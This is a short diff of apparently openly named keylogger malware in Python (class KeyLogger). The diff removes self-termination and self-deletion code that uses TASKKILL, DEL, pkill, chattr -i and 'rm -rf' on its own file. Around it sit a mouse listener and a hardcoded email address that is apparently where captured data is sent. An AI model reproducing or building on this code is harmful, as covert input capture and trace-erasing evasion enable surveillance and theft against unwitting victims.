@@ -125,26 +125,7 @@ class KeyLogger:
         with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
             mouse_listener.join()
         
-        if os.name == "nt":
-            try:
-                pwd = os.path.abspath(os.getcwd())
-                os.system("cd " + pwd)
-                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                print('File was closed.')
-                os.system("DEL " + os.path.basename(__file__))
-            except OSError:
-                print('File is close.')
 
-        else:
-            try:
-                pwd = os.path.abspath(os.getcwd())
-                os.system("cd " + pwd)
-                os.system('pkill leafpad')
-                os.system("chattr -i " +  os.path.basename(__file__))
-                print('File was closed.')
-                os.system("rm -rf" + os.path.basename(__file__))
-            except OSError:
-                print('File is close.')
 
 
 email_address = "bycerannn@yandex.com"
